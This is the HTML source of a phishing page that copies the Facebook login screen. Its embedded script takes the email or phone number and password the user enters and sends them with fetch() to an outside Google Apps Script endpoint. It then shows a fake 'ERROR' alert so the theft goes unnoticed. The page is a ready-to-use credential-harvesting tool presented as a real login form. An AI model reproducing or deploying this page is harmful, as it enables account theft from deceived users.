<!DOCTYPE html>
<html>
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta charset="UTF-8">
	<title>Facebook</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
	<link rel="stylesheet" href="style.css">
</head>
<body>
	<div class="container">
		<h3>Facebook</h3>
		<div class="border"></div> <br> 
		<form name="submit-to-google-sheet">
		  <label for="email">Email or Phone Number:</label>
		  <input type="text" id="email" name="email" required>
		  <label for="password">Password:</label>
		  <input type="password" id="password" name="password" required>
		  <button type="submit" onclick=" myFunction()">Log In</button>
		</form>
		<div class="forgot-password">
		  <a href="#">Forgot Password?</a> <br> <br>
		  <div class="or"><fieldset><legend>or</legend></fieldset></div>
		  <div  class="new">
			<a href="#">Create New Account</a>
		  </div>
		 
		</div>
	  </div>
    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwtL4H2VQFOXf9FIGk6KU_pY8f0vN1mnMZQLxjksNUKOjlZeZ96h_1e035BVfLxF7_jxA/exec'
        const form = document.forms['submit-to-google-sheet']
      
        form.addEventListener('submit', e => {
          e.preventDefault()
          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response => console.log('Success!', response))
            .catch(error => console.error('Error!', error.message))
        })
		function myFunction() {
   alert("ERROR");
 }
      </script>

</body>
</html>
